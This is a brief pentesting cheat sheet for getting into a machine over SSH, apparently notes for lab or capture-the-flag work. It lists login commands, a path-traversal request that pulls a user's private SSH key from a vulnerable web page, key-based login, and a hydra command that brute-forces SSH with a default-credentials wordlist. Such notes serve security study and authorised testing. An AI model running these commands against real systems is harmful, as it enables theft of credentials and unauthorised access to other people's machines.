# SSH

You can’t get initial access directly however we can login with user and password and private key.

#### 1) Login with credentials

    ssh noman@ip

    ssh -p 2222 noman@192.168.10.10 ( ssh use with different port )

#### 2) Get ssh private key via LFI (example)

    curl http://<ip>/index.php?page=../../../../../../../../../home/noman/.ssh/id_rsa

#### 3) Give permissions on key

    chmod 600 id_rsa

Then 

    ssh -i id_rsa -p 2222 noman@ip

    user/.ssh/authorized key

#### 4) Brute force default SSH credentials

    hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt IP ssh
